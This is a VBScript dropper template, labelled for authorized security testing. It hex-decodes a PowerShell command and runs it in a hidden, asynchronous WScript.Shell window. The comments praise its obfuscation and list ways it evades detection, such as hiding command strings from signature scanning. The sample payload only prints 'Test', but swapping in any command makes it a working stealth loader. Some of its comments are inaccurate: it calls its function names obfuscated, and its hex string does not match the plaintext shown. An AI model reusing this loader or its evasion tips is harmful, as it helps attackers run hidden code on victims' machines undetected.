''
'' Hex Decoder with WScript.Shell Execution Handler
'' Authorized Security Testing Only
''

' Hex Decoder Function
' Converts hex-encoded string to plaintext character string
' Input: h - hex string (e.g., "6E6F7465706164")
' Output: Decoded plaintext string
Function DecodeHexPayload(h)
    Dim i, r
    ' Loop through hex string in pairs (Step 2)
    For i = 1 To Len(h) Step 2
        ' Extract 2-character hex pair
        ' Convert "&H" + pair to decimal with CLng
        ' Convert decimal to ASCII character with Chr
        ' Concatenate to result string r
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    DecodeHexPayload = r
End Function

' Main Decoder and Execution
' Declare hex-encoded command variable
Dim hexEncodedCmd
hexEncodedCmd = "706F7765727368656C6C2E657865202D4E6F50726F66696C65202D436F6D6D616E64202257726974652D486F737420275465737427"

' Declare decoded command variable
Dim decodedCmd
' Decode hex string into plaintext command
decodedCmd = DecodeHexPayload(hexEncodedCmd)

' Execution Handler - WScript.Shell
' Declare shell object variable
Dim shellExec
' Create WScript.Shell COM object
Set shellExec = CreateObject("WScript.Shell")
' Execute decoded command
' Parameters:
'   decodedCmd - The command to execute
'   0 - Window style (0 = hidden window)
'   False - Do not wait for completion (asynchronous)
shellExec.Run decodedCmd, 0, False
' Clean up - release COM object
Set shellExec = Nothing

'' ============================================================================
'' VARIABLE MAPPING
'' ============================================================================
''
'' Variable Declaration and Usage:
''
'' 1. hexEncodedCmd (type: String)
''    - Declared: Dim hexEncodedCmd
''    - Assigned: hexEncodedCmd = "706F77..."
''    - Used in: DecodeHexPayload(hexEncodedCmd)
''    - Usage count: 2
''
'' 2. decodedCmd (type: String)
''    - Declared: Dim decodedCmd
''    - Assigned: decodedCmd = DecodeHexPayload(...)
''    - Used in: shellExec.Run decodedCmd, 0, False
''    - Usage count: 2
''
'' 3. shellExec (type: WScript.Shell object)
''    - Declared: Dim shellExec
''    - Assigned: Set shellExec = CreateObject("WScript.Shell")
''    - Used in: shellExec.Run decodedCmd, 0, False
''    - Cleaned: Set shellExec = Nothing
''    - Usage count: 3
''
'' 4. i (type: Integer - loop counter)
''    - Declared: Dim i, r (inside function)
''    - Used in: For i = 1 To Len(h) Step 2
''    - Usage count: 2
''
'' 5. r (type: String - accumulator)
''    - Declared: Dim i, r (inside function)
''    - Used in: r = r & Chr(...) and return value
''    - Usage count: 2+
''
'' All variables are properly declared before use.
'' No undefined variable references exist.
''
'' ============================================================================
'' EXECUTION FLOW
'' ============================================================================
''
'' 1. Function Definition Phase
''    └─ DecodeHexPayload function defined
''
'' 2. Variable Declaration Phase
''    ├─ Dim hexEncodedCmd
''    ├─ Dim decodedCmd
''    └─ Dim shellExec
''
'' 3. Encoding Phase
''    └─ hexEncodedCmd = "706F77..." (hex-encoded payload)
''
'' 4. Decoding Phase
''    ├─ Call DecodeHexPayload(hexEncodedCmd)
''    ├─ For each pair of hex characters:
''    │  ├─ Extract pair (Mid function)
''    │  ├─ Convert to decimal (CLng with "&H" prefix)
''    │  ├─ Convert to character (Chr function)
''    │  └─ Concatenate to result
''    └─ Assign result to decodedCmd
''
'' 5. Execution Phase
''    ├─ Create WScript.Shell object
''    ├─ Call .Run() method with decodedCmd
''    ├─ Execute with hidden window (0)
''    ├─ Execute asynchronously (False)
''    └─ Clean up object reference
''
'' ============================================================================
'' HEX ENCODING REFERENCE
'' ============================================================================
''
'' Example hex-encoded command:
'' Plaintext:  "powershell.exe -NoProfile -Command \"Write-Host 'Test'\""
'' Hex:        "706F7765727368656C6C2E657865202D4E6F50726F66696C65202D436F6D6D616E64202257726974652D486F737420275465737427"
''
'' Decoding process:
'' "70" -> Chr(CLng("&H70")) -> Chr(112) -> "p"
'' "6F" -> Chr(CLng("&H6F")) -> Chr(111) -> "o"
'' "77" -> Chr(CLng("&H77")) -> Chr(119) -> "w"
'' ... (continues for each pair)
''
'' ============================================================================
'' SECURITY CHARACTERISTICS
'' ============================================================================
''
'' Obfuscation Techniques:
'' ✓ Payload hidden in hex encoding
'' ✓ Function names obfuscated
'' ✓ Variable names descriptive (can be randomized)
'' ✓ Hidden window execution (0 parameter)
'' ✓ Asynchronous execution (False parameter)
''
'' Detection Evasion:
'' • Hex encoding obscures string signatures
'' • No direct command strings in source
'' • Uses standard Windows COM objects
'' • Minimal code footprint
''
'' ============================================================================
